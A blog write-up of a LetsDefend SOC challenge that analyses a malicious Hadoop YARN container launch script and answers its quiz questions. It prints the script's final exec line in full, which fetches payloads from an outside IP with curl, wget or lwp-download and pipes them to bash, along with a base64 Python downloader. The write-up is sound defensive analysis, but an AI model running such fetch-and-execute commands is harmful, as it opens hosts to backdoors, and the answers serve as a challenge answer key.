---
title: "Let's Defend - Bash Script"
categories: "LetsDefend"
tags: ["Linux", "Bash", "Container"]
description: "A small writeup for LetsDefend's challenge 'Bash Script'."
date: 2025-02-28T19:07:18-06:00
image: ldef.png
math: 
license: 
hidden: false
---
## Description
>The SOC team uncovered a suspicious bash script linked to a critical Hadoop YARN cluster that handled large-scale data processing. This script was flagged for further investigation by L1 SOC analysts, who suspected it could be a potential breach. You have been tasked to analyze the bash script to uncover its intent

## Investigation

The file starts off by defining several environment variables for what looks to be container deployment:
```bash
#!/bin/bash

set -o pipefail -e
export PRELAUNCH_OUT="/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/prelaunch.out"
exec >"${PRELAUNCH_OUT}"
export PRELAUNCH_ERR="/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/prelaunch.err"
exec 2>"${PRELAUNCH_ERR}"
echo "Setting up env variables"
export JAVA_HOME=${JAVA_HOME:-"/usr/lib/jvm/jre-1.8.0-openjdk-1.8.0.275.b01-1.el8_3.x86_64"}
export HADOOP_COMMON_HOME=${HADOOP_COMMON_HOME:-"/root/apps/hadoop-3.2.2"}
export HADOOP_HDFS_HOME=${HADOOP_HDFS_HOME:-"/root/apps/hadoop-3.2.2"}
export HADOOP_CONF_DIR=${HADOOP_CONF_DIR:-"/root/apps/hadoop-3.2.2/etc/hadoop"}
export HADOOP_YARN_HOME=${HADOOP_YARN_HOME:-"/root/apps/hadoop-3.2.2"}
export HADOOP_HOME=${HADOOP_HOME:-"/root/apps/hadoop-3.2.2"}
export PATH=${PATH:-"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin"}
export LANG=${LANG:-"en_US.utf8"}
<...SNIP...>
```

Nothing stands out to me as particularly exciting except for the section on  "Launching container" at the end:
```bash
echo "Launching container"
exec /bin/bash -c "(curl -s http://209.141.40.190/xms || wget -q -O - http://209.141.40.190/xms || lwp-download http://209.141.40.190/xms /tmp/xms) | bash -sh; bash /tmp/xms; rm -rf /tmp/xms; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDkuMTQxLjQwLjE5MC9kLnB5IikucmVhZCgpKSc= | base64 -d | bash -"
```

It seems very unusual for a container launch to involve `curl` `wget` or `lwp-download` and piping the contents to `bash`. There is also a base64 string that also looks suspicious on decode:
```
python -c 'import urllib;exec(urllib.urlopen("http://209.141.40.190/d.py").read())'
```

## Answers

### 1. What is the path set to the standard output log file?

This is part of the exports, an export to PRELAUNCH_OUT:
```
/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/prelaunch.out
```

### 2. Which environment variable specifies the Java home directory?

Asking what env is used for the java home I think?

```
export JAVA_HOME=${JAVA_HOME:-"/usr/lib/jvm/jre-1.8.0-openjdk-1.8.0.275.b01-1.el8_3.x86_64"}
```

The env will be `JAVA_HOME` as this is the variable being set with export.


### 3. What is the value of the “NM_HTTP_PORT” environment variable?

This is also in the variables being defined:

```
export NM_HTTP_PORT="8042"
```

It's looking for the answer `8042`.

### 4. What directory is set as the “LOCAL_DIRS” environment variable?

Once again asking about an environment variable being assigned. Just look for LOCAL_DIRS:

```
export LOCAL_DIRS="/root/apps/hadoopdata/nm-local-dir/usercache/dr.who/appcache/application_1617763119642_4002"
```

### 5. The script executes a line at the end of it. What is it?

The description does not really reflect what the answer is expecting. Here, they want the decoded base64 segment.

```
python -c 'import urllib;exec(urllib.urlopen("http://209.141.40.190/d.py").read())'
```

### 6. Which command is used to create a copy of the launch script?

Answer is the bash command `cp`.

### 7. What command is executed to determine the directory contents?

This information is presented in the script as part of displaying cwd contents:

```
# Determining directory contents
echo "ls -l:" 1>"/root/apps/hadoop-3.2.2/logs/userlogs/application_1617763119642_4002/container_1617763119642_4002_01_000001/directory.info"
```

### 8. What IP address is used for downloading a script from the remote server?

The IP address is what is used in the `exec` at the end of the script.

## Impact

Most of the deployment script appears benign except for the final `exec` line. 

```bash
(curl -s http://209.141.40.190/xms || wget -q -O - http://209.141.40.190/xms || lwp-download http://209.141.40.190/xms /tmp/xms)
```

There is redundancy here in retrieving the `xms` file to account for situations where `curl` or `wget` might not be present on the system. The goal is likely to have the host execute the `xms` payload, which is very likely a reverse shell/backdoor.

```
python -c 'import urllib;exec(urllib.urlopen("http://209.141.40.190/d.py").read())'
```

This is also likely another attempt to establish remote shell/backdoor persistence on the host. Notably it is targeting a different file, `d.py`, as this is for python-based execution instead of bash.
